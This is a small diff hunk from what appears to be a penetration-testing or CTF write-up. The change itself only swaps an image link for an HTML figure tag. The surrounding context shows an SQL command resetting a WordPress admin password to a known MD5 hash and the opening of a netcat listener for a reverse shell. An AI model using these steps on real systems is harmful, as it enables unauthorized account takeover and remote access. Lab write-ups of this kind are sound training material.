@@ -73,7 +73,9 @@ update wp_users set user_pass="5f4dcc3b5aa765d61d8327deb882cf99" where id=1;
 
 ## Login wordpress
 
-!\[\[Pasted image 20231022130312.png]]
+
+
+<figure><img src="../.gitbook/assets/Pasted image 20231022130312 (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 nc -lvnp 1234
